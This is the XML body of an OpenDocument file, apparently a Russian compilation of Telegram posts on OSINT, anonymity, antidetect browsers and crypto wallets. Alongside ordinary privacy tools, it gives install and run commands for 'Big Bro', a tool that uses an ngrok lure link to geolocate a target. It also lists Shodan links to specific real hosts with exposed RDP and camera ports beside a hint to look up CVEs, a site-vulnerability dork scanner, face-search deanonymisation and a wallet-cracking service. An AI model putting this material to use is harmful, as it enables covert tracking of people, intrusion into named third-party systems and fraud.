      <text:p text:style-name="P2">Срок хранения кук</text:p>
      <text:p text:style-name="P2">0 = Срок хранения задан сервером</text:p>
      <text:p text:style-name="P2">1 = Пользователь вручную устанавливает срок хранения</text:p>
      <text:p text:style-name="P2">2 = Срок хранения ограничен сессией (до закрытия браузера)</text:p>
      <text:p text:style-name="P2">3 = Срок хранения ограничен значением дней из настройки network.cookie.lifetime.days</text:p>
      <text:p text:style-name="P2">network.http.referer.trimmingPolicy = 2</text:p>
      <text:p text:style-name="P2">Настройка отправляемых данных в заголовке Referer</text:p>
      <text:p text:style-name="P2">0 = URL целиком</text:p>
      <text:p text:style-name="P2">1 = URL без параметров</text:p>
      <text:p text:style-name="P2">2 = Только протокол, хост и порт</text:p>
      <text:p text:style-name="P2">webgl.disabled = true</text:p>
      <text:p text:style-name="P6">Отключение WebGL как потенциального риска безопасности (источник)</text:p>
      <text:p text:style-name="P2">Подборка антидетект браузеров. Часть 3.</text:p>
      <text:p text:style-name="P2">1. https://antidetect.online/</text:p>
      <text:p text:style-name="P2">2. https://accovod.com/</text:p>
      <text:p text:style-name="P2">3. https://ru.aezakmi.run/</text:p>
      <text:p text:style-name="P2">4. https://www.ivanovation.ro/</text:p>
      <text:p text:style-name="P2">5. http://lizard-program.ru/multi-browser.html</text:p>
      <text:p text:style-name="P2">6. https://www.nofingerprinting.com/</text:p>
      <text:p text:style-name="P2">7. https://cypher-antibrowser.net/</text:p>
      <text:p text:style-name="P2">8. https://ls.tenebris.cc/</text:p>
      <text:p text:style-name="P2">9. https://ghostbrowser.com</text:p>
      <text:p text:style-name="P7">10. https://indigobrowser.com/</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">Определение местоположение цели</text:span></text:p>
      <text:p text:style-name="P2">Big Bro - Инструмент для определения местоположения устройств с помощью веб-сайта. Утилита генерирует ссылку, перейдя по которой нужно разрешить доступ к определению местоположения, тогда в терминале будет отображена геопозиция с радиусом разброса местоположения всего 1-10 метров. Установка:</text:p>
      <text:p text:style-name="P2">git clone https://github.com/Bafomet666/Bigbro</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd Bigbro</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">7z x 'Big bro 5.0.7z'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd 'Big bro 5.0'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">chmod +x install.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">bash termux_install.sh</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">В</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">новом</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">окне</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">запускаем</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">ngrok</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">ngrok http 8080</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Использование</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">python3 bigbro.py -t manual</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Подборка OSINT инструментов. Часть 19. Web: телефон и фото.</text:p>
      <text:p text:style-name="P2">1. Всевидящее око (https://t.me/datasearch_robot?start=145016585) - очередное рабочее зеркало EoG, пользуйтесь на здоровье.</text:p>
      <text:p text:style-name="P2">2. Who Calls (https://www.kaspersky.ru/caller-id) - аналог GetContact, но с другой базой. Разработан Лабораторией Касперского, я не фанат их продуктов, но в пробиве все средства хороши.</text:p>
      <text:p text:style-name="P2">3. TrueCaller (https://www.truecaller.com/) - еще одно приложение для пробива по номеру но, но с другой базой и расширенным функционалом. Например, можно блокировать вызовы или записывать их.</text:p>
      <text:p text:style-name="P2">4. InstaDP (https://instadp.io/) - скачает вам фото профиля Instagram для дальнейшего пробива. </text:p>
      <text:p text:style-name="P2">5. Dupli Checker (https://www.duplichecker.com/reverse-image-search.php) - поиск похожих фотографий в интернете. <text:s/>Отличное дополнение к уже названным здесь и здесь инструментам. </text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">6. RevEye (https://chrome.google.com/webstore/detail/reveye-reverse-image-sear/keaaclcjhehbbapnphnmpiklalfhelgf) - расширение для Chrome с открытым </text:span><text:soft-page-break/><text:span text:style-name="T3">исходным кодом, которое пробивает фотографию с помощью Google, Bing, Yandex и TinEye.</text:span></text:p>
      <text:p text:style-name="P6">7. Betaface (http://betaface.com/demo_old.html) - сравнивает фотографии людей и помогает вам понять, один и тот же человек изображен на фото, или нет. </text:p>
      <text:p text:style-name="P2">Must have расширения в вашем браузере</text:p>
      <text:p text:style-name="P2">1. uBlock Origin 1.39.0 <text:s/>(https://github.com/gorhill/uBlock/) - <text:s/>свежий выпуск популярного расширения для блокировки рекламы. Ранее я упоминал его здесь. </text:p>
      <text:p text:style-name="P2">2. Cookie AutoDelete (https://addons.mozilla.org/ru/firefox/addon/cookie-autodelete/) - автоматически удаляет куки, когда они больше не используются открытыми браузерными вкладками. </text:p>
      <text:p text:style-name="P2">3. Skizzle (https://www.skizzlehq.com/) - расширение для шифрования файлов, которые вы крепите к письмам в Gmail. </text:p>
      <text:p text:style-name="P15">4. Disable WebRTC (https://addons.mozilla.org/ru/firefox/addon/happy-bonobo-disable-webrtc/) - полезное браузерное расширение, устраняющее утечку вашего реального IP адреса через WebRTC.</text:p>
      <text:p text:style-name="P2">5. AudioContext Fingerprint Defender (https://addons.mozilla.org/ru/firefox/addon/audioctx-fingerprint-defender/) - расширение, которое подменяет ваш звуковой отпечаток браузера фейковым. </text:p>
      <text:p text:style-name="P2">6. Enigmail (https://enigmail.net/index.php/en/) - это расширение Thunderbird (https://t.me/c/1338162138/111), позволяющее осуществлять шифрование сообщений электронной почты в один клик.</text:p>
      <text:p text:style-name="P2">7. Trocker (https://addons.mozilla.org/en-US/firefox/addon/trockerapp/) - расширение, которое блокирует почтовые трекеры (пиксели). </text:p>
      <text:p text:style-name="P2">8. CanvasBlocker (https://addons.mozilla.org/ru/firefox/addon/canvasblocker/) - расширение, которое позволяет запретить веб-сайтам использовать некоторые API JavaScript с целью идентификации их отпечатка браузера. </text:p>
      <text:p text:style-name="P7">9. History Cleaner (https://addons.mozilla.org/en-US/firefox/addon/history-cleaner/?src=collection) - расширение для удаления более старых файлов истории, чем предлагает браузер в настройках.</text:p>
      <text:p text:style-name="P2">KO-dork для поиска уязвимостей сайтов в Termux</text:p>
      <text:p text:style-name="P2">KO-dork - комплексная утилита, написанная на языке Python для поиска уязвимостей сайтов.</text:p>
      <text:p text:style-name="P2">Утилита лёгкая в использовании и поддерживается Termux.</text:p>
      <text:p text:style-name="P2">Давайте рассмотрим процесс установки и запуска:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Установка</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg update &amp;&amp; pkg upgrade</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">pkg install git python2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">git clone https://github.com/ciku370/ko-dork</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Запуск</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd ko-dork</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">python2 dork.py</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Убираем вотермарки и другие элементы с изображения. Часть 2.</text:p>
      <text:p text:style-name="P2">1. Watermark Remover (https://www.watermarkremover.io/) - убирает с помощью ИИ буквально за пару секунд все водяные знаки с фото.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">2. Hama (https://www.hama.app/en) - тоже использует нейросеть для удаления объектов с фото. </text:span></text:p>
      <text:p text:style-name="P7">3. ANYMP4 (https://www.anymp4.com/ru/watermark-remover-online/) - еще один бесплатный сервис удаления водяных знаков, использующий ИИ. </text:p>
      <text:p text:style-name="P2">Бэкап Termux</text:p>
      <text:p text:style-name="P12">Простое резервное копирование с автоматическим сжатием:</text:p>
      <text:p text:style-name="P16">#termux-backup /sdcard/backup.tar.xz</text:p>
      <text:p text:style-name="P2">Формат сжатия определяется расширением файла, которое обычно.tar.gz (gzip), .tar.xz (xz) или .tar (без сжатия).</text:p>
      <text:p text:style-name="P2">Можно передавать содержимое резервной копии на стандартный выход, например, шифровать его с помощью утилиты GnuPG или отправлять в удаленное хранилище. Задайте имя файла как "-", чтобы включить потоковую передачу в stdout:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">#termux-backup - | gpg --symmetric --output /sdcard/backup.tar.gpg</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P6">Содержимое, записанное в stdout, не сжимается.</text:p>
      <text:p text:style-name="P2">Подборка OSINT инструментов. Часть 20. Крипта.</text:p>
      <text:p text:style-name="P2">1. OXT (https://oxt.me/) - еще один неплохой обозреватель крито-транзакций с приятным дизайном, поиском взаимосвязей и другим функционалом. В т.ч. определяет адреса даркнет площадок.</text:p>
      <text:p text:style-name="P2">2. CryptoTxAlert (https://www.cryptotxalert.com/) - позволяет установить мониторинг за определенным крипто-кошельком. Платный сервис.</text:p>
      <text:p text:style-name="P2">3. BlockPath <text:s/>(https://blockpath.com/) - обозреватель + визуализатор транзакций. Скорее аналитический инструмент, чем просто эксплоер.</text:p>
      <text:p text:style-name="P2">4. Green Stage Bot (https://t.me/green_stage_bot) - бот для проверки чистоты крипты и поиска взаимосвязей между крипто-адресами. </text:p>
      <text:p text:style-name="P2">5. Bitcoin Abuse (https://www.bitcoinabuse.com/) - сайт-отзовик, где можно найти информацию о ВТС-адресах, связанных со скамом, вирусами шифровальщиками и не только.</text:p>
      <text:p text:style-name="P2">Бонус: ищем более точную информацию о крипто адресе в Google, используя дорки</text:p>
      <text:p text:style-name="P2">адрес кошелька+-block </text:p>
      <text:p text:style-name="P2">или </text:p>
      <text:p text:style-name="P4"><text:soft-page-break/><text:span text:style-name="T3">адрес кошелька-1+|+адрес кошелька-2-block</text:span></text:p>
      <text:p text:style-name="P2">Мессенджеры:</text:p>
      <text:p text:style-name="P2">AirChat - мессенджер, который работает без интернета - https://apps.apple.com/ru/app/air-chat/id583584427</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Session - мессенджер, который не просит никаких данных для регистрации - https://getsession.org</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Рубрика "Приватность и безопасность". <text:s/></text:p>
      <text:p text:style-name="P2">[1] О чем говорит ваша страница в соц.сетях? (https://t.me/c/1058779651/698)</text:p>
      <text:p text:style-name="P2">[2] Прятки с Windows 10. Тестируем программы для отключения слежки и повышения приватности. (https://t.me/c/1058779651/2132)</text:p>
      <text:p text:style-name="P2">[3] Больше не твои документы. Как выглядят облачные хранилища глазами хакера. (https://t.me/c/1058779651/4939)</text:p>
      <text:p text:style-name="P2">[4] Антикриминалистика. Как защитить смартфон от извлечения данных. (https://t.me/c/1058779651/2026)</text:p>
      <text:p text:style-name="P6">[5] Шифруйся грамотно! Выбираем мессенджер для безопасной и приватной переписки. Часть 1. (https://t.me/c/1058779651/1128) Часть 2. (https://t.me/c/1058779651/1198) Часть 3. (https://t.me/c/1058779651/2054)</text:p>
      <text:p text:style-name="P2">Камеры и RDP</text:p>
      <text:p text:style-name="P2">Гуглим по типу "CVE-****-****"</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/150.254.183.4#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/217.8.239.132#554</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/103.207.39.162#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/88.214.26.41#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/64.235.34.13#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/175.203.206.212#8000</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/122.117.206.218#554</text:p>
      <text:p text:style-name="P12">https://beta.shodan.io/host/122.117.93.5#554</text:p>
      <text:p text:style-name="P12">https://beta.shodan.io/host/121.149.186.142#554</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/88.214.26.41#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/190.189.251.22#3389</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">https://beta.shodan.io/host/64.235.34.13#3389</text:span></text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/122.117.93.5#554</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/217.8.239.132#554</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/159.138.117.148#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/150.254.183.4#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/190.189.251.22#3389</text:p>
      <text:p text:style-name="P2">https://beta.shodan.io/host/45.127.196.19#3389</text:p>
      <text:p text:style-name="P6">https://beta.shodan.io/host/194.75.58.182#3389</text:p>
      <text:p text:style-name="P2">Разбираемся с Jabber</text:p>
      <text:p text:style-name="P7">Как ни странно, в эпоху существования Matrix, «жаба» продолжает пользоваться популярностью в даркнет сообществе и далеко продвинулась в приватности, если 10 лет назад это был максимум Pidgin + OTR, то сейчас существует целое обилие разнообразных клиентов, шифрование OMEMO и анонимные сервера, которых раньше было существенно меньше. Инструкции по настройке я не публикую, на мой взгляд они слишком просты, да и в интернете их целое обилие. <text:s/>Выбор клиентов на сегодня настолько разнообразен, что недавно я публиковал полный список Jabber-клиентов и мессенджеров, поддерживающих OMEMO шифрование. В него вошло порядка 50 вариаций «жабы». Регистрация сервера тоже стала более вариативной. Никуда не делся классический вариант xmpp.jp, хотя его регистрация сейчас только здесь (https://www.xmpp.jp/signup?lang=ru) и невозможна через какой-нибудь клиент, как это работало ранее. Если сравнивать OMEMO с OTR, то можно смело заявить: преимуществ первого над последним существенно больше.</text:p>
      <text:p text:style-name="P2">Как замаскировать данные в изображении?</text:p>
      <text:p text:style-name="P17"><text:span text:style-name="T3">Если пользователь пытается скрыть данные с помощью шифрования, значит в файле наверняка есть что-то важное. Поэтому иногда важнее не столько зашифровать, сколько скрыть само наличие секретной информации на жестком диске. В таких случаях на помощь приходит стеганография. Она позволяет без специальных знаний и особых усилий спрятать файл в картинку или какую-нибудь нечем непримечательную песню. Steghide (http://steghide.sourceforge.net/index.php) - это инструмент стеганографии, </text:span><text:soft-page-break/><text:span text:style-name="T3">который использует код доступа, чтобы скрыть личные файлы внутри изображения или аудиофайла. Утилита скрывает биты файла с конфиденциальными данными в битах другого файла (с менее значимой информацией).</text:span></text:p>
      <text:p text:style-name="P18">Поддерживаются типы изображений BMP и JPEG, а также аудиоформаты AU и WAV. По умолчанию файл зашифрован с использованием алгоритма Rijndael с размером ключа 128 бит. Утилита реализована по ОС Windows и Linux. Подробную инструкцию по установке можно найти в репозитории (https://github.com/StefanoDeVuono/steghide). Команда «steghide embed -cf picture.jpeg -ef secretfile.txt» скроет файл «secretfile.txt» в изображении «picture.jpg». После вы можете удалить секретный файл и восстановить его при необходимости из изображения командой «steghide extract -sf picture.jpeg».</text:p>
      <text:p text:style-name="P2">Подборка различных чекеров. Часть 1.</text:p>
      <text:p text:style-name="P2">1. https://coveryourtracks.eff.org/ - всем известный IP чекер</text:p>
      <text:p text:style-name="P2">2. https://ipleak.net/ - еще один </text:p>
      <text:p text:style-name="P2">3. https://audiofingerprint.openwpm.com/ - чекер аудиофингерпринта</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">4. https://canvasblocker.kkapsner.de/test/ - </text:span><text:span text:style-name="T3">чекер</text:span><text:span text:style-name="T2"> canvas</text:span></text:p>
      <text:p text:style-name="P2">6. https://www.dnsleaktest.com/ - чекер утечки dns</text:p>
      <text:p text:style-name="P2">7. https://mullvad.net/en/check/ - проверка вашего торрент клиента на утечку IP</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">8. https://email-checker.net/ - проверяет, существует ли почтовый ящик</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P6">10. https://www.deviceinfo.me/ - выдает общую информацию об устройстве;</text:p>
      <text:p text:style-name="P6">openvpn-install (https://github.com/angristan/openvpn-install) - скрипт, позволяющий установить OpenVPN на *nix системах буквально за пару секунд.</text:p>
      <text:p text:style-name="P2">Восстанавливаем доступ к ВТС кошелькам:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. btcrecover <text:s/>(https://github.com/gurnec/btcrecover/blob/master/TUTORIAL.md#running-btcrecover) - очень полезный и функциональный софт для восстановления доступа к вашему ВТС кошельку. Функционал очень широк: можно брутить пароль к файлу кошелька, можно восстановить пароль из seed-фразы + адреса </text:span><text:soft-page-break/><text:span text:style-name="T3">пополнения. Работает, в том числе, с холодными кошельками. Чем больше данных у вас о кошельке есть, тем выше шанс восстановления. Мне помогло. </text:span></text:p>
      <text:p text:style-name="P2">2. bip39 от iancoleman (https://github.com/iancoleman/bip39/releases/) - софт с открытым исходным кодом, который поможет вам из вашей seed-фразы получить приватный ключ от кошелька. Есть еще онлайн версия. <text:s/>(https://iancoleman.io/bip39/)Здесь нужно быть очень внимательным. Существует много различных фейков, заделанных под этот сервис. Их цель - украсть у вас seed-фразы. Будьте бдительны! </text:p>
      <text:p text:style-name="P19">3. walletrecoveryservices (https://www.walletrecoveryservices.com/) - магический сервис гениального Дэвида, который взламывает кошельки за 20% от их стоимости. Ему нужно предоставить всевозможные данные о вашем кошельке, в т.ч. 2ФА, если она есть. Сервис кристально чистый и даже в открытом исходном коде Ethereum он указан, как единственный способ восстановления пароля. Обращался лично, все работает, могу подтвердить, как угодно.</text:p>
      <text:p text:style-name="P12">Подборка различных чекеров. Часть 2.</text:p>
      <text:p text:style-name="P2">https://emailipleak.com/ - показывает утечку вашего IPv4 адреса;</text:p>
      <text:p text:style-name="P2">https://amiunique.org/ - показывает отпечаток вашего браузера;</text:p>
      <text:p text:style-name="P2">https://www.hidemyass.com/en-us/webrtc-leak-test - чекает утечку IP через WebRTC;</text:p>
      <text:p text:style-name="P2">https://www.ipaddress.com/trace-email.html - может узнать IP отправителя письма;</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://www.grc.com/dns/dns.htm - dns spoofability test;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https://w3c.github.io/uievents/tools/key-event-viewer.html - keyboard event viewer;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">http://permission.site/ - чекет доступы браузера;</text:p>
      <text:p text:style-name="P2">https://www.ssllabs.com/ssltest/ - ssl-тест различных сайтов;</text:p>
      <text:p text:style-name="P2">https://whoer.net/ru - популярный комплексный чекер;</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">https://www.howsmyssl.com/ - ssl-тест браузера</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Большая подборка крипто-сервисов и не только. BTC кошельки</text:p>
      <text:p text:style-name="P2">1. Bitcoin Core (https://bitcoin.org/ru/wallets/desktop/windows/bitcoincore/) - можно сказать, официальный десктопный кошелек. Требует наличие SSD диска.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">2. Electrum - программный ВТС-кошелек с открытым исходным кодом. Есть 2ФА, настраиваемый.</text:span></text:p>
      <text:p text:style-name="P2">3. Samourai (https://samouraiwallet.com/) - ВТС-кошелек для Android пользователей. Использует CoinJoin для анонимизации транзакций. </text:p>
      <text:p text:style-name="P2">4. Sparrow Wallet (https://sparrowwallet.com/) - легковесный десктопный ВТС кошелек. +CoinJoin. Для пользователей Mac, Windows, Linux.</text:p>
      <text:p text:style-name="P2">5. Wasabi (https://wasabiwallet.io/) - старенький, но проверенный временем декстопный кошелек. Открытый исходный код, использует CoinJoin. </text:p>
      <text:p text:style-name="P2">XMR кошельки</text:p>
      <text:p text:style-name="P2">1. Monero GUI Wallet (https://www.getmonero.org/downloads/#gui) - официальный десктопный кошелек Monero. </text:p>
      <text:p text:style-name="P2">2. Feather (https://featherwallet.org/) - неплохая, легковесная и минималистичная альтернатива официальному кошельку.</text:p>
      <text:p text:style-name="P2">3. Monerujo (https://www.monerujo.io/) - XMR-кошелек для Android пользователей. </text:p>
      <text:p text:style-name="P2">Мультивалютные кошельки</text:p>
      <text:p text:style-name="P2">1. Trust Wallet (https://trustwallet.com/) - самый популярный мультивалютный крипто кошелек. </text:p>
      <text:p text:style-name="P15">2. Mycelium Bitcoin Wallet (https://wallet.mycelium.com/) - поддерживает BTC и ERC20 токены.</text:p>
      <text:p text:style-name="P2">3. Cake Wallet (https://cakewallet.com/) - кошелек на iOS, поддерживает ВТС, LTC, XMR. </text:p>
      <text:p text:style-name="P2">Холодные кошельки</text:p>
      <text:p text:style-name="P2">1. Bitlox Ultimate (https://www.bitlox.com/products/bitlox-ultimate) - безопасный кошелек холодного хранения, заточенный на анонимность. Буквально нафарширован фичами, связанными с безопасностью.</text:p>
      <text:p text:style-name="P2">2. Safe Pal (https://store.safepal.com/safepal-s1-hardware-wallet.html) - неплохой кошелек холодного хранения с поддержкой внушительного списка монет и air gap технологией.</text:p>
      <text:p text:style-name="P7">3. Ledger (https://www.ledger.com/) - самый популярный холодный кошелек. Остерегайтесь подделок!</text:p>
      <text:p text:style-name="P2">OSINT и мониторинг</text:p>
      <text:p text:style-name="P2">1. OXT (https://oxt.me/) - еще один неплохой обозреватель крито-транзакций с приятным дизайном, поиском взаимосвязей и другим функционалом.</text:p>
      <text:p text:style-name="P2">2. Blockchair (https://blockchair.com/) - известный обозреватель транзакций и адресов в сотнях сетей. </text:p>
      <text:p text:style-name="P2">3. Walletexplorer (https://www.walletexplorer.com/) - устанавливает связи ВТС адреса с различными крипто-сервисами и проверяет баланс. </text:p>
      <text:p text:style-name="P2">4. Blockcypher (https://live.blockcypher.com/) - обозреватель транзакций в ВТС, ETH, LTC, Dash, Doge, GrIn сетях.</text:p>
      <text:p text:style-name="P7">5. Green Stage Bot (https://t.me/green_stage_bot) - бот для проверки чистоты крипты и поиска взаимосвязей между крипто-адресами.</text:p>
      <text:p text:style-name="P2">Крипто-мессенджеры</text:p>
      <text:p text:style-name="P2">1. Mixin (https://mixin.one/) - мессенджер-кошелек, использующий протокол Signal для отправки сообщений.</text:p>
      <text:p text:style-name="P2">2. Adamant - анонимный и защищённый мессенджер, <text:s/>работающий на блокчейне Ethereum.</text:p>
      <text:p text:style-name="P2">3. Status - безопасный мессенджер с поддержкой E2EE, встроенным ETH-кошельком и поддержкой DApps.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">4. iMe Messenger &amp; Crypto Wallet (https://imem.app/) - еще один крутой мессенджер с поддержкой ERC-20 и BSC токенов и интеграцией через Telegram API. </text:span></text:p>
      <text:p text:style-name="P2">Восстановление доступа</text:p>
      <text:p text:style-name="P2">1. btcrecover <text:s/>(https://github.com/gurnec/btcrecover/blob/master/TUTORIAL.md#running-btcrecover) - очень полезный и функциональный софт для восстановления доступа к вашему ВТС кошельку.</text:p>
      <text:p text:style-name="P2">2. bip39 от iancoleman (https://github.com/iancoleman/bip39/releases/) - софт, который поможет вам из вашей seed-фразы получить приватный ключ от кошелька.</text:p>
      <text:p text:style-name="P19">3. walletrecoveryservices (https://www.walletrecoveryservices.com/) - магический сервис гениального Дэвида, который взламывает кошельки за 20% от их стоимости.</text:p>
      <text:p text:style-name="P12">Проверяем крипто-скам</text:p>
      <text:p text:style-name="P2">1. Honeypot Detector (https://honeypot.is/) <text:s/>- незаменимый сервис для тех, кто занимается криптой. Позволяет определить скам-токены в BSC сети и проверять контракты. </text:p>
      <text:p text:style-name="P7">2. Bscheck, (http://www.bscheck.eu/) похожий сервис, который способен определить такие проблемы, как: Ханипот: сканер определит возможность продажи только на определенные кошельки (dev wallets); Владелец контракта: если владелец контракта все еще существует, то он может изменить код в любое время. Отказ от права собственности на контракт - это распространенный способ показать, что владелец не замышляет ничего коварного; Информация о кошельке разработчика: сколько токенов принадлежит разработчикам и членам команды? Это важно, потому что, если они владеют большинством процентов токенов, то теоретически они могут “разграбить” проект, выбросив свои токены в продажу.</text:p>
      <text:p text:style-name="P2">Блэк лист из «приватных» приложений</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. Mesh мессенджер Bridgefy, упомянутый ранее в канале (упоминания удалены). Пруф с разбором. (https://arstechnica.com/features/2020/08/bridgefy-the-</text:span><text:soft-page-break/><text:span text:style-name="T3">app-promoted-for-mass-protests-is-a-privacy-disaster/) Там целая пачка недостатков, от легкой MitM атаки до деанонимизации юзеров.</text:span></text:p>
      <text:p text:style-name="P2">2. Мессенджер Signal, имеющий много дыр в безопасности. Свежая утечка <text:s/>(https://t.me/c/1058779651/7073)юзеров была только в августе. <text:s/>(https://t.me/c/1058779651/7073)Не знаю, нужно ли комментировать все баги и уязвимости с 2017 по 2022 год.</text:p>
      <text:p text:style-name="P2">3. Браузер Brave. Без комменатриев. Они, конечно, по всякому отнекиваются, но это ничего не значит. Пруф (https://spyware.neocities.org/articles/brave_ru.html).</text:p>
      <text:p text:style-name="P2">4. Чистильщик CCleaner. Ранее упоминал отличную альтернативу - BleachBit. А так, можно почитать о недостатках здесь. (https://spyware.neocities.org/articles/ccleaner.html)</text:p>
      <text:p text:style-name="P2">5. Почта Proton. Здесь не все так однозначно и ящик популярный и защищенный в техническом смысле, но общеизвестный слив сервисом IP адресов пользователей (https://habr.com/ru/news/t/576708/) (которые Proton типо не собирали), немного напрягает. А вас?</text:p>
      <text:p text:style-name="P6">Сюда же: любой бесплатный VPN и проприетарный софт.</text:p>
      <text:p text:style-name="P2">Храним файлы в безопасном облаке</text:p>
      <text:p text:style-name="P2">1. Cryptee - бесплатный сервис для надежного хранения документов, файлов и фотографий. Исходный код открыт. Регистрация анонимная.</text:p>
      <text:p text:style-name="P2">2. e2ee cloud - облачное хранилище с открытым исходным кодом и сквозным шифрованием. </text:p>
      <text:p text:style-name="P2">3. Filen (https://filen.io/) - zero-knowledge, e2e облако с 10 ГБ пространства на бесплатном тарифе. </text:p>
      <text:p text:style-name="P12">4. Nextcloud <text:s/>(https://nextcloud.com/) - это набор бесплатных клиент-серверных программ с открытым исходным кодом для создания собственных файлообменников на частном сервере. Альтернатива DropBox, Google Drive или Office 365.</text:p>
      <text:p text:style-name="P12">5. MEGA (https://mega.io/) - старый и не нуждающийся в представлении сервис. Использует сквозное шифрование, 20 ГБ бесплатно. (недавно раскрыли ненадежное шифрование)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">6. Peergos - защищенное р2р файловое хранилище <text:s/>+ социальная сеть. По своей сути представляет децентрализованную сеть с возможностью загрузки, хранения и обмена файлами. </text:span></text:p>
      <text:p text:style-name="P2">7. Uploadgram (https://github.com/Pato05/uploadgram-app/releases/tag/v1.0.0-beta.6) - приложение, которое позволяет анонимно загружать и обмениваться файлами через сервера Telegram. Не требует регистрации и авторизации. Полностью открытый исходный код, доступный на GitHub.</text:p>
      <text:p text:style-name="P7">8. Tahoe-LAFS - бесплатный децентрализованный облачный сервис для хранения данных.</text:p>
      <text:p text:style-name="P2">Бесплатный аналог FindClone</text:p>
      <text:p text:style-name="P2">Search4Faces (https://search4faces.com/vk01/index.html) - веб-сайт с бесплатным функционалом и фильтрами для поиска людей в соц. сетях по лицу. Сайт (https://search4faces.com/vk01/index.html) предоставляет доступ ко всем функциям абсолютно бесплатно и позволяет производить поиск людей по лицу. Вы можете использовать фильтры и настраивать параметры по своему усмотрению, например указав количество результатов, выбрав страну, город, возраст и пол. Благодаря технологии нейронных сетей и машинному обучению вы можете найти нужного человека или очень на него похожего в течении нескольких секунд. Результатом является ссылка на профиль найденного человека в социальной сети. Вы также можете использовать API сервиса (https://search4faces.com/api.html) учитывая, что его работа с API построена на архитектуре JSON-RPC 2.0 (http://www.jsonrpc.org/specification). Запрос обязательно должен содержать следующие HTTP-заголовки:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Content-Type: application/json</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">x-authorization-token: API_</text:span><text:span text:style-name="T3">ключ</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">На данный момент доступны поиск фотографий в профилях ВК, аватарок ВК и ОК по новым базе и алгоритмам, аватарок клубхауса, тиктока и публичных персон.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">Списки XMPP серверов </text:p>
